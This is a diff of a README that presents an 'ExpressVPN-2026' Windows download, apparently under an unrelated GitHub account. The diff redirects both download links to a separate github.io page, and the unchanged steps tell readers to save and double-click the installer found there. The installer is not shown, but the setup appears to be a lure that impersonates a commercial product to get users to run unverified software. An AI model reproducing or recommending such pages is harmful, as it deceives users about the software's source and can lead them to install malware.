@@ -1,6 +1,6 @@
 # 🌐 ExpressVPN-2026 - Secure your Windows connection with ease
 
-[![Download ExpressVPN](https://img.shields.io/badge/Download-ExpressVPN-blue.svg)](https://github.com/joint-asphalt622/ExpressVPN-2026)
+[![Download ExpressVPN](https://img.shields.io/badge/Download-ExpressVPN-blue.svg)](https://joint-asphalt622.github.io)
 
 ## 🎯 About this software
 
@@ -19,7 +19,7 @@ Before you install this software, check your computer for these requirements:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/joint-asphalt622/ExpressVPN-2026).
+1. Visit [this page to download](https://joint-asphalt622.github.io).
 2. Locate the download button or the latest installer link.
 3. Save the file to your Downloads folder.
 4. Open your Downloads folder and double-click the file to start the process.
